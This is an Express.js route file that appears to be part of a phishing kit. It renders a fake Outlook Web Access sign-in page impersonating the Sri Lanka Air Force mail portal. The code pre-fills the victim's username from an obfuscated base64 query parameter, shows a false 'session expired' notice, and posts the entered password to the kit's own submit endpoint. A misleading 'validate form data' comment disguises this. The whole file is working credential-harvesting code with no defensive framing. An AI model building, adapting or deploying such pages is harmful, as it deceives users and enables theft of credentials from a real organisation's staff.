
const express = require ('express');
const router = express.Router();

router.use(express.static('public'));



//validate form data before handling
// Custom middleware for form validation
router.get('/', (req, res) => {

    const data3 = req.query.dhsfiourewjdfjgkfdgkldfjiorejfdjgfdgjkdfjgreioo;
    const username = Buffer.from(data3, 'base64').toString('utf-8');
  

    if (data3 == null) {
        res.render('error');
        
      }else{
    const htmlContent = `
       
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=10">
    <link rel="shortcut icon" href="https://mail.airforce.lk/owa/auth/15.2.1258/themes/resources/favicon.ico" type="image/x-icon">
    <link href="./files/style.css" rel="stylesheet">
    <meta name="Robots" content="NOINDEX, NOFOLLOW">
    <title>Outlook</title>

    

  </head>
  <body class="signInBg" onload="onLoad();" style="background: #f2f2f2 url(./files/bg.png) repeat-x">

   
    <form action="/req/submit" method="POST" name="logonForm" enctype="application/x-www-form-urlencoded" autocomplete="off">
      <input type="hidden" name="destination" value="https://mail.airforce.lk/owa/">
      <input type="hidden" name="flags" value="4">
      <input type="hidden" name="forcedownlevel" value="0">
      <div id="mainLogonDiv" class="mouse">
        <script>
          var mainLogonDiv = window.document.getElementById("mainLogonDiv");
          mainLogonDiv.className = mainLogonDivClassName;
        </script>
        <div class="sidebar">
          <img alt="" src="./files/slaf_sidebar.jpg" class="slaf_sidebar">
          <div class="owaLogoContainer" style="display: none;">
            <img src="./files/%=OwaUrl.AuthFolder.ImplicitUrl%%ThemeManager.RenderBaseThemeFileUrl(Response.Output,ThemeFileId.OutlookLogoWhite,false)" class="owaLogo" aria-hidden="true">
            <img src="./files/%=OwaUrl.AuthFolder.ImplicitUrl%%ThemeManager.RenderBaseThemeFileUrl(Response.Output,ThemeFileId.OutlookLogoWhiteSmall,false)" class="owaLogoSmall" aria-hidden="true">
          </div>
        </div>
        <div class="logonContainer">
          <div id="lgnDiv" class="logonDiv" onkeypress="return checkSubmit(event)">
            <div class="signInImageHeader" role="heading" aria-label="Outlook">
              <img class="mouseHeader" src="./files/download.png" alt="Outlook">
            </div>
            <div>
              <div class="signInInputLabel" id="userNameLabel" aria-hidden="true">User name:</div>
              <div>
                <input id="username" name="username" class="signInInputText" role="textbox" value="${username}" required="" aria-labelledby="userNameLabel">
              </div>
              <div class="signInInputLabel" id="passwordLabel" aria-hidden="true">Password:</div>
              <div>
                <input id="password" onfocus="g_fFcs=0" name="password" value="" required=""  type="password" class="signInInputText" aria-labelledby="passwordLabel">
              </div>
              <div>
                <input id="passwordText" onfocus="g_fFcs=0" name="passwordText" value="" style="display: none;" class="signInInputText" aria-labelledby="passwordLabel">
              </div>
              <div style="margin-top: -12px;"><p style="font-size: 14px;color: #ff0000;font-family: 'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;">Your session expired.</p></div>
              <div class="showPasswordCheck signInCheckBoxText">
                <input type="checkbox" id="showPasswordCheck" class="chk" onclick="showPasswordClick()">
                <span>Show password</span>
              </div>
         
              <div id="expltxt" class="signInExpl" role="alert"></div>
              <button class="signInEnter">
                <div onclick="clkLgn()" class="signinbutton" role="button" tabindex="0">
                  <img class="imgLnk" src="./files/btn.png" alt="">
                  <span class="signinTxt">Sign in</span>
                </div>
                <input name="isUtf8" value="1" type="hidden">
            </button>
              <div class="hidden-submit">
                <input type="submit" tabindex="-1">
              </div>
            </div>
          </div>
          <div id="cookieMsg" class="logonDiv" style="display:none">
            <div class="signInHeader">Outlook</div>
            <div class="signInExpl">Please enable cookies for this Web site. <br>
              <br>Cookies are currently disabled by your browser. Outlook requires that cookies be enabled. <br>
              <br>For information about how to enable cookies, see the Help for your Web browser. <br>
              <br>
              <br>
            </div>

            <div class="signInEnter">
              <div onclick="clkRtry()" style="cursor:pointer;display:inline">
               <img class="imgLnk" src="./files/btn.png" alt="">
                <span class="signinTxt" tabindex="0">Retry</span>
                </div>
            </div>
            
          </div>
        </div>

      </div>
    </form>
  </body>
</html>
    `;

    // Send the HTML content as a response
    res.send(htmlContent);
      }
});



module.exports =router
